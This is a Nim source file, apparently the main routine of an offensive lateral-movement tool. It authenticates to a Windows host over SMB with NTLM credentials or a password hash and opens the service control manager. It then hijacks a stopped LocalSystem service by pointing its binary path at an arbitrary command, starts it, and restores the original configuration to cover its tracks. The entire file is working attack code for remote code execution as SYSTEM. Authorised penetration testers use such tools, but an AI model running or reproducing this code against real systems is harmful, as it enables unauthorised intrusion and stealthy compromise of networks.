import std/os
import std/random
import std/unicode
import system
import net
import OptionsHelper
import Structs
import Packets

proc SelectRandomService(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceList: ptr seq[ServiceInfo], selectedServiceInfo: ptr ServiceInfo,smbSigning:bool, hmacSha256Key: ptr byte):string =
    var lengthOfServiceList = serviceList[].len
    var scServiceHandle:array[20,byte]
    var returnValue: string
    #discard OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,"sense",addr scServiceHandle,smbSigning,hmacSha256Key)
    #messageID[] = messageID[]+1
    #callID[] = callID[]+1
    #discard OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,"TieringEngineService",addr scServiceHandle,smbSigning,hmacSha256Key)
    #discard QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr testService,smbSigning,hmacSha256Key)
    #discard CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)

    shuffle(serviceList[])
    for i in countup(0,lengthOfServiceList-1): # You can increase try limit
        if(serviceList[][i].ServiceState == SERVICE_STOPPED):
            if(not OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,serviceList[][i].ServiceName,addr scServiceHandle,smbSigning,hmacSha256Key)):
                messageID[] = messageID[]+1
                callID[] = callID[]+1
                continue
            if(not QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr serviceList[][i],smbSigning,hmacSha256Key)):
                messageID[] = messageID[]+1
                callID[] = callID[]+1
                continue
            if((serviceList[][i].StartType == SERVICE_DEMAND_START or serviceList[][i].StartType == SERVICE_DISABLED) and serviceList[][i].Dependencies == "/" and toLower(serviceList[][i].ServiceStartName) == "localsystem"):
                returnValue = serviceList[][i].ServiceName
                selectedServiceInfo[] = serviceList[][i]
                if(not CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)):
                    messageID[] = messageID[]+1
                    callID[] = callID[]+1
                return returnValue
            if(not CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)):
                messageID[] = messageID[]+1
                callID[] = callID[]+1
                continue
            
    return ""
        
      
proc StartNimExec():void = 
    var serviceName: string
    var messageID:uint64 = 0
    var treeID:array[4,byte]
    var sessionID:array[8,byte]
    var fileID:array[16,byte]
    var scManagerHandle:array[20,byte]
    var scServiceHandle:array[20,byte]
    var smbSigning:bool = false
    var callID:int = 0
    var optionsStruct:OPTIONS 
    var tcpSocket:net.Socket = newSocket(buffered=false)
    var smbNegotiateFlags:seq[byte] = newSeq[byte](4)
    var smbSessionKeyLength:seq[byte] = newSeq[byte](2)
    var hmacSha256Key:array[16,byte]
    var newCommand:string 
    var serviceList:seq[ServiceInfo]
    var selectedServiceInfo:ServiceInfo
    PrintBanner()
    if(not ParseArgs(paramCount(),commandLineParams(),addr optionsStruct)):
        echo "[!] Error unknown or missing parameters!"
        PrintHelp() 
        quit(0)
    
    if(optionsStruct.Domain != ""):
        optionsStruct.OutputUsername = optionsStruct.Domain & "\\" & optionsStruct.Username
    else:
        optionsStruct.OutputUsername = optionsStruct.Username
    var targetBytesInWCharForm:WideCStringObj = newWideCString(optionsStruct.Target) # .len property doesn't count its double null bytes, and it doesn't
    # var test = targetBytesInWCharForm.len
    # var test2:array[4,byte]
    # copyMem(addr test2[0],addr targetBytesInWCharForm[0],6)
    try:
        tcpSocket.connect(optionsStruct.Target,Port(445),60000)
    except CatchableError:
        var e = getCurrentException()
        var msg = getCurrentExceptionMsg()
        echo "[!] Got exception ", repr(e), " with message ", msg
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Connected to ", optionsStruct.Target, ":445"
    if(not NegotiateSMB2(tcpSocket,addr messageID,addr treeID, addr sessionID,addr smbNegotiateFlags, addr smbSessionKeyLength, addr smbSigning)):
        echo "[!] Problem in NegotiateSMB2 request!"
        quit(0)
    if(not NTLMAuthentication(tcpSocket,addr optionsStruct,smbNegotiateFlags,smbSessionKeyLength,addr messageID,addr treeID, addr sessionID, smbSigning, addr hmacSha256Key)):
        echo "[!] Problem in NTLM Authentication requests!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] NTLM Authentication with Hash is succesfull!"
    if(not TreeConnectRequest(tcpSocket,addr optionsStruct, addr messageID, addr treeID, addr sessionID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in Tree Connect Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Connected to IPC Share of target!"
    if(not CreateRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in CreateFile Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Opened a handle for svcctl pipe!"
    if(not RPCBindRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in RPC Bind Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Binded to the RPC Interface!"
    if(not ReadRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in RPC Bind Acknowledge!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] RPC Binding is acknowledged!"
    if(not OpenSCManagerWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, targetBytesInWCharForm,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in OpenSCManagerW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] SCManager handle is obtained!"
    newCommand = optionsStruct.Command
    if(optionsStruct.Service != ""):
        serviceName = optionsStruct.Service
    else:
        if(not EnumServicesStatusWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,addr serviceList, smbSigning,addr hmacSha256Key[0])):
            echo "[!] Problem in EnumServicesStatusW RPC!"
            quit(0)
        randomize()
        serviceName = SelectRandomService(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList, addr selectedServiceInfo, smbSigning,addr hmacSha256Key[0])
        if(serviceName == ""):
            echo "[!] Cannot find a suitable service!"
            quit(0)
    
    echo "[+] Selected service is ", serviceName
    
    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,serviceName,addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
            echo "[!] Problem in OpenServiceW RPC!"
            quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service: ",serviceName ," is opened!"

    if(optionsStruct.Service != ""):
        if(not QueryServiceConfigWRPC(tcpSocket,addr messageID,addr treeID,addr sessionID,addr fileID,addr callID,addr scServiceHandle, addr selectedServiceInfo,smbSigning,addr hmacSha256Key[0])):
            echo "[!] Problem in QueryServiceConfigW RPC!"
            quit(0)
    
    var previousServicePath:string = selectedServiceInfo.BinaryPath
    if(optionsStruct.IsVerbose):
        echo "[+] Previous Service Path is: ",previousServicePath

    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, cast[uint32](SERVICE_DEMAND_START), newCommand,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in ChangeServiceConfigW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service config is changed!"
    if(not StartServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in StartServiceW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service start request is sent!"
    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, cast[uint32](selectedServiceInfo.StartType), previousServicePath,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in ChangeServiceConfigW RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service config is restored!"
    if(not CloseServiceHandleRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in CloseServiceHandle RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service handle is closed!"
    if(not CloseServiceHandleRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in CloseServiceHandle RPC!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Service Manager handle is closed!"
    if(not SMB2Close(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in SMB2 Close Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] SMB is closed!"    
    if(not TreeDisconnectRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in Tree Disconnect Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Tree is disconnected!"  
    if(not SessionLogoffRequest(tcpSocket, addr messageID, addr treeID, addr sessionID, smbSigning,addr hmacSha256Key[0])):
        echo "[!] Problem in Session Logoff Request!"
        quit(0)
    if(optionsStruct.IsVerbose):
        echo "[+] Session logoff!"  

when isMainModule:
    StartNimExec()